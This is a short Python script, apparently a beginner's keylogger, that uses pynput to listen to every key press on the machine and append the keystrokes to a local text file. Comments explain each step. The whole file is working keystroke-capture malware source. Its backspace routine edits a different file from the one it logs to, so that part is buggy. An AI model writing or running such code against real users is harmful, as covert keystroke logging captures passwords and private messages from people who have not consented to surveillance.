from pynput.keyboard import Key, Listener


key_replacements = {                     # Dictionary to map special keys to their replacements
    Key.space: ' ',
    Key.shift_r: '',
    Key.ctrl_l: '',
    Key.enter: '\n',
    Key.shift: '',
    Key.left: '',
    Key.right: '',
    Key.up: '',
    Key.down: ''
}

def file_save(key):                            # a function that is called whenever a key is pressed
    if key == Key.backspace:                   # checks if backspace is pressed if it is then calls delete_last_character
        delete_last_character()
    else:

        data_key = key_replacements.get(key, str(key))
        data_key = data_key.replace("'", "")
        with open("text2.txt", "a") as keylogger:  # opens a text file in append mode, it uses 'with' to properly close it
            keylogger.write(data_key)

def delete_last_character():                    # the function for backspace
    with open("text.txt", "r+") as key:         # opens the text file in read and write mode
        letter = list(key.read())
        if letter:                             # checks whether the list is empty
            letter.pop()                       # removes last letter
            key.seek(0)                        # brings the pointer to the beginning of the file
            key.truncate()                     # reduces the size and makes sure all the unnecessary letters are gone
            key.write(''.join(letter))         # writes the modified content back to the file

with Listener(on_press=file_save) as L:     # Listens for keyboard events 'on_press' specifies the function to be called
    L.join()                                # Starts the listeners until it is stopped